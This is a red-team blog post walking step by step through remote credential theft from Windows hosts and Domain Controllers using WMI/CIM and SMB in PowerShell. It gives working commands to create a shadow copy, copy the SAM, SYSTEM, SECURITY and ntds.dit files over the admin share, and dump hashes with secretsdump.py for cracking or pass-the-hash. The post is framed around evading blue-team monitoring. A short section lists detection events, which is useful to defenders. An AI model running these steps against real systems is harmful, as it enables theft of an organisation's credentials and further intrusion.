---
layout: post
title:  "Extracting credentials from a remote Windows system - Living off the Land"
date:   2020-05-26 09:00:00
excerpt: "How to obtain the credentials from a remote machine or Domain Controller making only use of Windows' built-in functionality? This post will go through the steps of using WMI and SMB in PowerShell from an attacker Windows machine to get hold of the remote files storing the credentials and subsequently extracting them."
categories: living-off-the-land windows credentials
permalink: /extracting-credentials-from-remote-windows-system
---
*[WMI]: Windows Management Instrumentation
*[CIM]: Common Information Model
*[WinRM]: Windows Remote Management
*[RPC]: Remote Procedure Call
*[DCOM]: Distributed Component Object Model
*[COM]: Component Object Model

Recently we performed a red teaming engagement where we wanted to dump the credentials from a remote host. We got the credentials of a user which has administrative privileges on the victim host and wanted to get more credentials from that host. Because we felt that the blue team was closely observing the environment this needed to be done in a stealthy manner and preferably only involving native Windows tooling. That is when we came up with the following approach in order to obtain a remote system's `SYSTEM`, `SECURITY` and `SAM` files from `%SystemRoot%\System32\Config` making use of WMI and SMB. This approach can also be used to obtain the `ntds.dit` file from a Domain Controller in order to obtain the credentials of the complete organization.

# Conditions
In this article we will first use our attacker Windows machine to make a shadow copy on the remote system using WMI and then use SMB to download the credential files from the shadow copy. Assumptions are that ports 445/TCP (SMB) _and_ one of 135/TCP (DCOM), 5985/TCP (WinRM) or 5986/TCP (WinRM over SSL) are accessible, and we have administrative access to the victim machine. We will be using DCOM which uses port 135/TCP to communicate. Moreover, the current PowerShell instance is running as a user which has administrative access on the victim host (DC01.mydomain.local) obtain the local credentials.

# Small introduction to WMI
WMI stands for Windows Management Instrumentation and can be used to read out management information from Windows and perform actions on a variety of components which provide a WMI interface. WMI can be accessed locally using for example PowerShell, VBScript, wmic.exe and COM, while remotely WMI can be accessed using WinRM and DCOM.

PowerShell provides both WMI and CIM cmdlets. Common Information Model (CIM) is an open standard from the Distributed Management Task Force (DMTF) while WMI is Microsoft's implementation of CIM for Windows. In this article we will use the CIM cmdlets, but the WMI cmdlets will function equally well.

# Session establishment
In case you are executing this attack from a machine outside of the domain, or whenever you need to use different credentials to authenticate to the victim host, use the `runas.exe` tool to launch your PowerShell with credentials which can be used to authenticate. Now whenever this PowerShell instance is requested to authenticate on the network, it will use the credentials as provided to the `runas.exe` tool. Alternatively the `-Credential` parameter can be used for the `New-CimSession` cmdlet.
```
runas.exe /netonly /user:MyDomain\MyUser powershell.exe
```
After launching PowerShell we start with initiating a new CIM session with the remote host over DCOM and storing this in the `$s` variable. In case you want to use WinRM instead, omit the `-SessionOption` parameter of the `New-CimSession` cmdlet.
```powershell
PS C:\> $h = 'DC01.mydomain.local'
PS C:\> $so = New-CimSessionOption -Protocol Dcom
PS C:\> $s = New-CimSession -ComputerName $h -SessionOption $so
```

# Create shadow copy
Once the session is established we invoke the `Create` function of the `Win32_ShadowCopy` WMI class [^1] providing the `Volume` parameter to create a shadow copy of the Windows installation drive which contains the files we want to obtain. Once executed, The `ReturnValue` of `0` shows that creation of the shadow copy was successful. Based on the `ShadowID` we fetch all details of the shadow copy. An alternative to creating a new shadow copy would be to check if there are already any (recent) shadow copies, in which case you can simply use that shadow copy and proceed with the next steps. This can be done by executing the `Get-CimInstance` cmdlet below without the `-Filter` parameter.

```powershell
PS C:\> $r = Invoke-CimMethod -ClassName Win32_ShadowCopy -MethodName Create -Arguments @{Volume='C:\'} -CimSession $s
PS C:\> $r | fl


ReturnValue    : 0
ShadowID       : {B15008D8-0C63-468C-AED7-ED4DB0CFD082}
PSComputerName : DC01.mydomain.local

 
PS C:\> $c = Get-CimInstance -ClassName Win32_ShadowCopy -CimSession $s -Filter "ID=`"$($r.ShadowID)`""
PS C:\> $c
 
 
Caption            :
Description        :
InstallDate        : 4/19/2020 9:34:01 PM
Name               :
Status             :
ClientAccessible   : True
Count              : 1
DeviceObject       : \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy6
Differential       : True
ExposedLocally     : False
ExposedName        :
ExposedPath        :
ExposedRemotely    : False
HardwareAssisted   : False
ID                 : {B15008D8-0C63-468C-AED7-ED4DB0CFD082}
Imported           : False
NoAutoRelease      : True
NotSurfaced        : False
NoWriters          : True
OriginatingMachine : DC01.mydomain.local
Persistent         : True
Plex               : False
ProviderID         : {B5946137-7B9F-4925-AF80-51ABD60B20D5}
ServiceMachine     : DC01.mydomain.local
SetID              : {083BBDBA-4517-45A2-A62E-3F52020BC47C}
State              : 12
Transportable      : False
VolumeName         : \\?\Volume{482bdb36-8a72-40a4-9b12-912d2783ef39}\
PSComputerName     : DC01.mydomain.local
```

# Obtain credential files
We want to copy the files from the SMB share, not simply from the `C$` share, but from the specific shadow copy we created. In Windows Explorer shadow copies are also known as Previous Versions which can be listed by opening the properties of a certain folder and then navigating to the Previous Versions tab. These Previous Versions are also accessible from the command line which is a date in a certain format prefixed with the @-symbol. Based on the shadow copy which is stored in the `$c` variable, we will compile the path from which to copy the files in the following PowerShell line.
```powershell
PS C:\> $p = '\\{0}\C$\{1}\Windows\System32\config' -f $h,$c.InstallDate.ToUniversalTime().ToString("'@GMT-'yyyy.MM.dd-HH.mm.ss")
PS C:\> $p
\\DC01.mydomain.local\C$\@GMT-2020.04.19-19.34.01\Windows\System32\config
```
After compiling the path we will copy the required files using the copy command to our local disk (in this case `C:\tmp`). Because creating the shadow copy might take a while when attempting to copy the files from the shadow copy path too quickly, it will result in an error that the path does not exist. In that case wait a bit and try again. Alternatively, in case you are logged in interactively, open the Properties of the `C$` share of the victim host in Windows Explorer and click Open for the shadow copy you created. In case you want to obtain the password hashes from a Domain Controller, this approach can also be used to remotely obtain the `ntds.dit` file from the (by default) `%SystemRoot%\NTDS` folder.
```powershell
PS C:\> copy $p\SYSTEM C:\tmp
PS C:\> copy $p\SECURITY C:\tmp
PS C:\> copy $p\SAM C:\tmp
```
After we successfully obtained the files containing the credentials we will perform the cleanup of shadow copy we created and close the connection to the victim host.
```powershell
PS C:\> $c | Remove-CimInstance
PS C:\> $s | Remove-CimSession
```

# Obtain and crack hashes
With the `SYSTEM`, `SECURITY` and `SAM` files or `SYSTEM` and `NTDS.dit` file now in our `C:\tmp` folder we can use our favorite tool to obtain the hashes. An example of such tool is `secretsdump.py` from Impacket [^2]. 

## SAM
```bash
secretsdump.py -system SYSTEM -security SECURITY -sam SAM LOCAL
```

## ntds.dit
```bash
secretsdump.py -system SYSTEM -ntds ntds.dit LOCAL
```
Subsequently the resulting hashes can be cracked with tools like John or Hashcat, or used in a pass the hash attack.

# Detection and artifacts
* Event ID 7036 on the victim host stating that the Microsoft Software Shadow Copy Provider service has been started
* Anomalous RPC/DCOM and SMB network connections between hosts which usually do not communicate

# Closing thoughts
Because the blue team is increasingly monitoring activity on both the network as well as on the machines itself, the red team is increasingly pushed towards using Windows native administrative tooling to stay under the radar. This attack shows that using WMI and SMB you are perfectly able to do that from PowerShell which will blend in with the management activities system administrators are performing on the network and systems.

# MITRE ATT&CK® references
* [T1047: Windows Management Instrumentation](https://attack.mitre.org/techniques/T1047/)
* [T1028: Windows Remote Management](https://attack.mitre.org/techniques/T1028/)
* [T1105: Remote File Copy](https://attack.mitre.org/techniques/T1105/)
* [T1077: Windows Admin Shares](https://attack.mitre.org/techniques/T1077/)
* Also related: [T1490: Inhibit System Recovery](https://attack.mitre.org/techniques/T1490/)

# References
[^1]: [Microsoft Docs - Create method of the Win32_ShadowCopy class](https://docs.microsoft.com/en-us/previous-versions/windows/desktop/vsswmi/create-method-in-class-win32-shadowcopy)
[^2]: [secretsdump.py in the Impacket library repository](https://github.com/SecureAuthCorp/impacket/blob/master/examples/secretsdump.py)
